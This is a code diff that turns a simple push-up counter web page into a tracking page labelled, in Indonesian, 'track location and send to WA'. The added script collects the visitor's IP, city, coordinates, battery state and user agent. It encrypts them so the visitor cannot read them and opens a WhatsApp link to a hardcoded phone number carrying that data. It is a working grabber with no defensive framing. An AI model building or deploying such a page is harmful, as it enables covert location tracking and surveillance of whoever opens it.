@@ -1,101 +1,111 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Push-up Counter</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding: 20px;
-    }
-    #counter {
-      font-size: 2em;
-      margin: 20px 0;
-    }
-    button {
-      padding: 10px 20px;
-      font-size: 1.2em;
-      margin: 10px;
-      cursor: pointer;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lacak IP & Kirim ke WA</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #f0f0f0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 350px;
+        }
+        h1 {
+            color: #333;
+        }
+        button {
+            background-color: #25d366;
+            color: white;
+            border: none;
+            padding: 15px;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 8px;
+            width: 100%;
+            margin-top: 20px;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #128c7e;
+        }
+        .status {
+            margin-top: 20px;
+            color: #333;
+        }
+    </style>
 </head>
 <body>
-  <h1>Push-up Counter</h1>
-  <p id="instructions">Buat suara seperti "hush" untuk menambah hitungan! Suara panjang hanya dihitung 1 kali.</p>
-  <div id="counter">Push-up Count: 0</div>
-  <button id="start-btn">Start Listening</button>
-  <button id="reset-btn">Reset</button>
 
-  <script>
-    let count = 0;
-    let listening = false;
-    let audioContext, analyser, microphone, dataArray;
-    let isSounding = false; // Apakah suara sedang aktif
+<div class="container">
+    <h1>Lacak Lokasi dan Kirim ke WA</h1>
+    <button onclick="trackAndSend()">Lacak dan Kirim</button>
+    <div class="status" id="status"></div>
+</div>
 
-    const counterEl = document.getElementById("counter");
-    const startBtn = document.getElementById("start-btn");
-    const resetBtn = document.getElementById("reset-btn");
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1-crypto-js.min.js"></script>
+<script>
+    async function trackAndSend() {
+        document.getElementById("status").innerText = "Memulai pelacakan...";
 
-    // Fungsi untuk memulai atau menghentikan pendengaran
-    startBtn.addEventListener("click", async () => {
-      if (!listening) {
-        // Memulai pendengaran
-        try {
-          const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-          audioContext = new (window.AudioContext || window.webkitAudioContext)();
-          analyser = audioContext.createAnalyser();
-          microphone = audioContext.createMediaStreamSource(stream);
-          analyser.fftSize = 256;
+        // Mendapatkan informasi lokasi menggunakan GeoJS
+        const geoData = await fetch('https://get.geojs.io/v1/ip/geo')
+            .then(response => response.json())
+            .catch(error => console.error('Error getting geolocation:', error));
 
-          const bufferLength = analyser.frequencyBinCount;
-          dataArray = new Uint8Array(bufferLength);
-          microphone.connect(analyser);
+        if (geoData) {
+            const ip = geoData.ip;
+            const city = geoData.city;
+            const country = geoData.country;
+            const latitude = geoData.latitude;
+            const longitude = geoData.longitude;
 
-          listening = true;
-          startBtn.textContent = "Stop Listening";
+            // Mendapatkan informasi baterai perangkat
+            const battery = await navigator.getBattery();
+            const batteryLevel = (battery.level * 100).toFixed(0);
+            const charging = battery.charging ? 'Yes' : 'No';
 
-          detectSound();
-        } catch (error) {
-          alert("Microphone access is required to use this feature.");
+            // Mendapatkan informasi merk device
+            const device = navigator.userAgent;
+
+            // Gabungkan data untuk dikirimkan
+            const data = {
+                ip,
+                city,
+                country,
+                latitude,
+                longitude,
+                batteryLevel,
+                charging,
+                device
+            };
+
+            // Enkripsi data menggunakan AES
+            const secretKey = 'your-secret-key'; // Ganti dengan kunci rahasia
+            const encryptedData = CryptoJS.AES.encrypt(JSON.stringify(data), secretKey).toString();
+
+            // Kirim data yang telah dienkripsi ke WhatsApp
+            const waUrl = `https://wa.me/087713740114?text=${encodeURIComponent(encryptedData)}`;
+            window.open(waUrl, '_blank');
+
+            // Update status
+            document.getElementById("status").innerText = "Data terkirim ke WA!";
+        } else {
+            document.getElementById("status").innerText = "Gagal mendapatkan data lokasi.";
         }
-      } else {
-        // Menghentikan pendengaran
-        listening = false;
-        startBtn.textContent = "Start Listening";
-        audioContext.close();
-      }
-    });
-
-    // Fungsi untuk mendeteksi suara
-    function detectSound() {
-      if (!listening) return;
-
-      analyser.getByteFrequencyData(dataArray);
-      const volume = dataArray.reduce((a, b) => a + b) / dataArray.length;
-
-      // Jika suara terdeteksi dan belum dihitung
-      if (volume > 30 && !isSounding) { // Threshold sensitivitas
-        isSounding = true; // Tandai bahwa suara sedang aktif
-        count++;
-        counterEl.textContent = `Push-up Count: ${count}`;
-      }
-
-      // Jika suara berhenti
-      if (volume < 10 && isSounding) { // Jika di bawah threshold suara
-        isSounding = false; // Tandai bahwa suara berhenti
-      }
-
-      requestAnimationFrame(detectSound); // Looping pendeteksian
     }
+</script>
 
-    // Fungsi untuk mereset hitungan
-    resetBtn.addEventListener("click", () => {
-      count = 0;
-      counterEl.textContent = "Push-up Count: 0";
-    });
-  </script>
 </body>
 </html>
